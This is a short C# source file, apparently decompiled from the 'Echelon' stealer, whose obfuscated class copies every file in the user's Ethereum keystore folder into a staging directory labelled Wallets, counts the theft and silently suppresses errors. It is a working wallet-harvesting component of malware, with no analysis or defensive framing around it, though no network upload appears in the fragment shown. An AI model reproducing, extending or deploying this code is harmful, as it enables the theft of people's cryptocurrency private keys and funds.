using Echelon;
using System.IO;

internal class av
{
	public static string a = "\\Wallets\\Ethereum\\";

	public static void a(string jq)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Ethereum\\keystore").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jq + av.a);
				fileInfo.CopyTo(jq + av.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}
}
